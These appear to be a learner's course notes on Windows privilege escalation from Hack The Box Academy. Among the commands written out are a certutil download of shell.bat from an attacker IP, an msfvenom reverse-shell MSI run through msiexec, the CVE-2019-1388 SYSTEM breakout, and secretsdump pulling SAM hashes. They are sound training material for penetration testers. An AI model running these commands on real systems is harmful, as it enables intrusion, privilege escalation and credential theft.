#### Transferring File with Certutil
One classic example is [certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

```powershell-session
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```
#### Encoding File with Certutil
We can use the `-encode` flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.

```cmd-session
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

#### Decoding File with Certutil
Once the new file has been created, we can use the `-decode` flag to decode the file back to its original contents.

```cmd-session
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

It is worth reviewing this project and becoming familiar with as many binaries, scripts, and libraries as possible. They could prove to be very useful during an evasive assessment, or one in which the client restricts us to only a managed Windows workstation/server instance to test from.

## Always Install Elevated
This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.

- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`
    

![image](https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png)

#### Enumerating Always Install Elevated Settings
```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.

## AUTOAMTE WITH METASPLOIT
```bash
exploit/windows/local/always_install_elevated
```
#### Generating MSI Package
We can exploit this by generating a malicious `MSI` package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

```shell-session
adot8@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

#### Executing MSI Package
We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so:

```cmd-session
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

## CVE-2019-1388

[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The `Issued By` field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. This OID value is identified in the [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) header as [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) which is the `SpcSpAgencyInfo` field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) that contains a certificate with the `SpcSpAgencyInfo` field populated with a hyperlink.

When we click on the hyperlink, a browser window will launch running as `NT AUTHORITY\SYSTEM`. Once the browser is opened, it is possible to "break out" of it by leveraging the `View page source` menu option to launch a `cmd.exe` or `PowerShell.exe` console as SYSTEM.

Let's run through the vulnerability in practice.

First right click on the `hhupd.exe` executable and select `Run as administrator` from the menu.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd.png)

Next, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)

Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)

If we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.

![image](https://academy.hackthebox.com/storage/modules/67/chrome_system.png)

Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png)

At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

![image](https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png)

Microsoft released a [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.

This [link](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) lists all of the vulnerable Windows Server and Workstation versions.

## Scheduled Tasks

#### Enumerating Scheduled Tasks
We can use the [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) command to enumerate scheduled tasks on the system.
```cmd-session
C:\htb>  schtasks /query /fo LIST /v
```

#### Enumerating Scheduled Tasks with PowerShell
We can also enumerate scheduled tasks using the [Get-ScheduledTask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps) PowerShell cmdlet.
```powershell-session
PS C:\htb> Get-ScheduledTask | select TaskName,State
```

By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\Windows\System32\Tasks`, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.
#### Checking Permissions on C:\Scripts Directory
Consider a scenario where we are on the fourth day of a two-week penetration test engagement. We have gained access to a handful of systems so far as unprivileged users and have exhausted all options for privilege escalation. Just at this moment, we notice a writeable `C:\Scripts` directory that we overlooked in our initial enumeration.

```cmd-session
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ‚åê 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

We notice various scripts in this directory, such as `db-backup.ps1`, `mailbox-backup.ps1`, etc., which are also all writeable by the `BUILTIN\USERS` group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis. We write a command to send a beacon back to our C2 infrastructure and carry on with testing. The next morning when we log on, we notice a single beacon as `NT AUTHORITY\SYSTEM` on the DB01 host. We can now safely assume that one of the backup scripts ran overnight and ran our appended code in the process. This is an example of how important even the slightest bit of information we uncover during enumeration can be to the success of our engagement. Enumeration and post-exploitation during an assessment are iterative processes. Each time we perform the same task across different systems, we may be gaining more pieces of the puzzle that, when put together, will get us to our goal.

## Mount VHDX/VMDK

During our enumeration, we will often come across interesting files both locally and on network share drives. We may find passwords, SSH keys or other data that can be used to further our access. The tool [Snaffler](https://github.com/SnaffCon/Snaffler) can help us perform thorough enumeration that we could not otherwise perform by hand. The tool searches for many interesting file types, such as files containing the phrase "pass" in the file name, KeePass database files, SSH keys, web.config files, and many more.

Three specific file types of interest are `.vhd`, `.vhdx`, and `.vmdk` files. These are `Virtual Hard Disk`, `Virtual Hard Disk v2` (both used by Hyper-V), and `Virtual Machine Disk` (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of `.VMDK` and `.VHDX` files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.

If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.

#### Mount VMDK on Linux
```shell-session
adot8@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

#### Mount VHD/VHDX on Linux
```shell-session
adot8@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file. If preferred, we can use the [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.

![image](https://academy.hackthebox.com/storage/modules/67/mount.png)

For a `.vmdk` file, we can right-click and choose `Map Virtual Disk` from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation `File --> Map Virtual Disks` to map the disk onto our base system. We could also add the `.vmdk` file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use `7-Zip` to extract data from a .`vmdk` file. This [guide](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) illustrates many methods for gaining access to the files on a `.vmdk` file.

#### Retrieving Hashes using Secretsdump.py
Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.

```shell-session
adot8@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
